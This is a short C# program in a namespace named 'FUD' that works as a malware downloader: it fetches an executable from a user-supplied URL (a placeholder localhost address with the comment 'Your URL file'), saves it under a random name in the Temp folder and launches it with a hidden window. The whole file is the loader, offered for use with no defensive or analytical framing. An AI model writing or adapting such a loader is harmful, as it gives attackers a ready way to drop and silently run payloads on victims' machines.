using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace FUD
{
	internal class Program
	{
		private static void Main(string[] args) // Download your file and run this application
		{
			string url = "http://localhost"; // Your URL file
			string fileLocate = Program.FileName();
			Program.FileName();
			Program.Download(fileLocate, url);
			Program.Runprocess(fileLocate);
		}

		private static void Download(string FileLocate, string url) //Find your file
		{
			new WebClient().DownloadFile(new Uri(url), FileLocate + ".exe");
		}

		private static string FileName() // Remove to Temp Folder
		{
			string tempPath = Path.GetTempPath();
			string Ran = Path.GetRandomFileName();
			return tempPath + Ran;
		}

		private static void Runprocess(string FileLocate) // Start Process
		{
			new Process
			{
				StartInfo = 
				{
					FileName = FileLocate + ".exe",
					WindowStyle = ProcessWindowStyle.Hidden
				}
			}.Start();
		}
	}
}
